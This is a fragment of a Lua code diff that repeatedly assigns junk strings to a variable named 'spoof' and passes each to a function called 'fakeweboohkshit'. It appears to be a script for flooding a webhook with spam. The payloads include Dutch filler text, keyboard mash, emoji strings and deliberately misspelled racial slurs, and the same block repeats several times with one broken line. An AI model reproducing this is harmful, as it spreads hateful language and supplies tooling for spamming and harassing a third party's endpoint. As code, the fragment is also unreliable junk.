+	local spoof = "Kleederen onderling kettingen aangewend al er. Te lamamijn of ad opmeting wildrijk. Legden en sakais tonnen nu forten is en. Kapitalen ongunstig vereenigd af omgewoeld de gewijzigd. Er haalden duizend afneemt waarbij metalen te. Over nam als soms valt het lage gif toch. Stroomen ze dichtbij ik staatjes middelen krachten. Ik en dier op apen laag goed zake gaat.Meenemen lot centimes gezegend rug gebracht selangor. Eerst ieder hen tot langs. Ze luister deficit vordert beneden nachten nu hiertoe ze op. Kost al of voor en hard liep voet ze gaan. Gewoonlijk al gomsoorten feestdagen weggevoerd herkenbaar middelpunt af. Ter opgegraven verbazende ontwikkeld oog. En ze centraal talrijke resident in. Rechten bontste opnieuw hoeveel ze of streken houweel.	Is gebrachte olifanten loodrecht te nu. Houweel plantte toe zes bereikt gelaten tin. Het losgemaakt gomsoorten beschikken tooverslag dan europeesch gewasschen. Nauwelijks dat ten intusschen afwachting ontginning tinprijzen die. Matig in niets er na welks zijde. Planter in tienden af in betaalt gesteld. Sakais dat pinang levert een ziekte parijs. Arbeiders zee verkregen voorschot heb opbrengst die afgestaan des. Bak fransche gevonden kleinste mineraal krachten van een millioen.	Tinerts dit hoeveel valorem bak. Oosten poging dik wolken ringen sap schaal. De af ruwe de sago nu diep goud hier. Had het nemen kan bevel mag zulke meest. Of wisselen sembilan op na indische nu. In aanraking op er mineralen voorkomen.Kinderen middelen dezelfde zin dal. Meehelpen nu onderling ze krachtige misschien. Laag vast tot land maar het hand. Als aldus telok tot beste het vraag lot. Der perzische besluiten sap ingenieur rug met. Op tabak te al er prijs komst."
+	fakeweboohkshit(spoof)
+	local spoof = "hoi"
+	fakeweboohkshit(spoof)
+	local spoof = "adgstsnkjgfjnkdasjkngdsjgewqt47uywgefb7 t8g45wryeuhjduy78ergfheiurwfahdsjkieuwfdhj8g7ut idfjkuygrefjhhuybgvjfgjkthvred----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]"
+	fakeweboohkshit(spoof)
+	local spoof = "nigjhfgjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "niggfdjgfjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "jghfdjdghjfgdj"local spoof = "appl👍🙀😎😼😺⭐🌲🌲😺😺😼😼😺e aka 🌲🙀\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"😾😻🌲\"red orang😻🙀👎😼👍e\""
+	fakeweboohkshit(spoof)
+	local spoof = "Kleederen onderling kettingen aangewend al er. Te lamamijn of ad opmeting wildrijk. Legden en sakais tonnen nu forten is en. Kapitalen ongunstig vereenigd af omgewoeld de gewijzigd. Er haalden duizend afneemt waarbij metalen te. Over nam als soms valt het lage gif toch. Stroomen ze dichtbij ik staatjes middelen krachten. Ik en dier op apen laag goed zake gaat.Meenemen lot centimes gezegend rug gebracht selangor. Eerst ieder hen tot langs. Ze luister deficit vordert beneden nachten nu hiertoe ze op. Kost al of voor en hard liep voet ze gaan. Gewoonlijk al gomsoorten feestdagen weggevoerd herkenbaar middelpunt af. Ter opgegraven verbazende ontwikkeld oog. En ze centraal talrijke resident in. Rechten bontste opnieuw hoeveel ze of streken houweel.	Is gebrachte olifanten loodrecht te nu. Houweel plantte toe zes bereikt gelaten tin. Het losgemaakt gomsoorten beschikken tooverslag dan europeesch gewasschen. Nauwelijks dat ten intusschen afwachting ontginning tinprijzen die. Matig in niets er na welks zijde. Planter in tienden af in betaalt gesteld. Sakais dat pinang levert een ziekte parijs. Arbeiders zee verkregen voorschot heb opbrengst die afgestaan des. Bak fransche gevonden kleinste mineraal krachten van een millioen.	Tinerts dit hoeveel valorem bak. Oosten poging dik wolken ringen sap schaal. De af ruwe de sago nu diep goud hier. Had het nemen kan bevel mag zulke meest. Of wisselen sembilan op na indische nu. In aanraking op er mineralen voorkomen.Kinderen middelen dezelfde zin dal. Meehelpen nu onderling ze krachtige misschien. Laag vast tot land maar het hand. Als aldus telok tot beste het vraag lot. Der perzische besluiten sap ingenieur rug met. Op tabak te al er prijs komst."
+	fakeweboohkshit(spoof)
+	local spoof = "hoi"
+	fakeweboohkshit(spoof)
+	local spoof = "adgstsnkjgfjnkdasjkngdsjgewqt47uywgefb7 t8g45wryeuhjduy78ergfheiurwfahdsjkieuwfdhj8g7ut idfjkuygrefjhhuybgvjfgjkthvred----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]"
+	fakeweboohkshit(spoof)
+	local spoof = "nigjhfgjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "niggfdjgfjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "jghfdjdghjfgdj"
+	local spoof = "appl👍🙀😎😼😺⭐🌲🌲😺😺😼😼😺e aka 🌲🙀\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"😾😻🌲\"red orang😻🙀👎😼👍e\""
+	fakeweboohkshit(spoof)
+	local spoof = "Kleederen onderling kettingen aangewend al er. Te lamamijn of ad opmeting wildrijk. Legden en sakais tonnen nu forten is en. Kapitalen ongunstig vereenigd af omgewoeld de gewijzigd. Er haalden duizend afneemt waarbij metalen te. Over nam als soms valt het lage gif toch. Stroomen ze dichtbij ik staatjes middelen krachten. Ik en dier op apen laag goed zake gaat.Meenemen lot centimes gezegend rug gebracht selangor. Eerst ieder hen tot langs. Ze luister deficit vordert beneden nachten nu hiertoe ze op. Kost al of voor en hard liep voet ze gaan. Gewoonlijk al gomsoorten feestdagen weggevoerd herkenbaar middelpunt af. Ter opgegraven verbazende ontwikkeld oog. En ze centraal talrijke resident in. Rechten bontste opnieuw hoeveel ze of streken houweel.	Is gebrachte olifanten loodrecht te nu. Houweel plantte toe zes bereikt gelaten tin. Het losgemaakt gomsoorten beschikken tooverslag dan europeesch gewasschen. Nauwelijks dat ten intusschen afwachting ontginning tinprijzen die. Matig in niets er na welks zijde. Planter in tienden af in betaalt gesteld. Sakais dat pinang levert een ziekte parijs. Arbeiders zee verkregen voorschot heb opbrengst die afgestaan des. Bak fransche gevonden kleinste mineraal krachten van een millioen.	Tinerts dit hoeveel valorem bak. Oosten poging dik wolken ringen sap schaal. De af ruwe de sago nu diep goud hier. Had het nemen kan bevel mag zulke meest. Of wisselen sembilan op na indische nu. In aanraking op er mineralen voorkomen.Kinderen middelen dezelfde zin dal. Meehelpen nu onderling ze krachtige misschien. Laag vast tot land maar het hand. Als aldus telok tot beste het vraag lot. Der perzische besluiten sap ingenieur rug met. Op tabak te al er prijs komst."
+	fakeweboohkshit(spoof)
+	local spoof = "hoi"
+	fakeweboohkshit(spoof)
+	local spoof = "adgstsnkjgfjnkdasjkngdsjgewqt47uywgefb7 t8g45wryeuhjduy78ergfheiurwfahdsjkieuwfdhj8g7ut idfjkuygrefjhhuybgvjfgjkthvred----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]"
+	fakeweboohkshit(spoof)
+	local spoof = "nigjhfgjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "niggfdjgfjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "jghfdjdghjfgdj"
+	local spoof = "appl👍🙀😎😼😺⭐🌲🌲😺😺😼😼😺e aka 🌲🙀\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"😾😻🌲\"red orang😻🙀👎😼👍e\""
+	fakeweboohkshit(spoof)
+	local spoof = "Kleederen onderling kettingen aangewend al er. Te lamamijn of ad opmeting wildrijk. Legden en sakais tonnen nu forten is en. Kapitalen ongunstig vereenigd af omgewoeld de gewijzigd. Er haalden duizend afneemt waarbij metalen te. Over nam als soms valt het lage gif toch. Stroomen ze dichtbij ik staatjes middelen krachten. Ik en dier op apen laag goed zake gaat.Meenemen lot centimes gezegend rug gebracht selangor. Eerst ieder hen tot langs. Ze luister deficit vordert beneden nachten nu hiertoe ze op. Kost al of voor en hard liep voet ze gaan. Gewoonlijk al gomsoorten feestdagen weggevoerd herkenbaar middelpunt af. Ter opgegraven verbazende ontwikkeld oog. En ze centraal talrijke resident in. Rechten bontste opnieuw hoeveel ze of streken houweel.	Is gebrachte olifanten loodrecht te nu. Houweel plantte toe zes bereikt gelaten tin. Het losgemaakt gomsoorten beschikken tooverslag dan europeesch gewasschen. Nauwelijks dat ten intusschen afwachting ontginning tinprijzen die. Matig in niets er na welks zijde. Planter in tienden af in betaalt gesteld. Sakais dat pinang levert een ziekte parijs. Arbeiders zee verkregen voorschot heb opbrengst die afgestaan des. Bak fransche gevonden kleinste mineraal krachten van een millioen.	Tinerts dit hoeveel valorem bak. Oosten poging dik wolken ringen sap schaal. De af ruwe de sago nu diep goud hier. Had het nemen kan bevel mag zulke meest. Of wisselen sembilan op na indische nu. In aanraking op er mineralen voorkomen.Kinderen middelen dezelfde zin dal. Meehelpen nu onderling ze krachtige misschien. Laag vast tot land maar het hand. Als aldus telok tot beste het vraag lot. Der perzische besluiten sap ingenieur rug met. Op tabak te al er prijs komst."
+	fakeweboohkshit(spoof)
+	local spoof = "hoi"
+	fakeweboohkshit(spoof)
+	local spoof = "adgstsnkjgfjnkdasjkngdsjgewqt47uywgefb7 t8g45wryeuhjduy78ergfheiurwfahdsjkieuwfdhj8g7ut idfjkuygrefjhhuybgvjfgjkthvred----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]"
+	fakeweboohkshit(spoof)
+	local spoof = "nigjhfgjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "niggfdjgfjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "jghfdjdghjfgdj"
+
+end
+
+return E
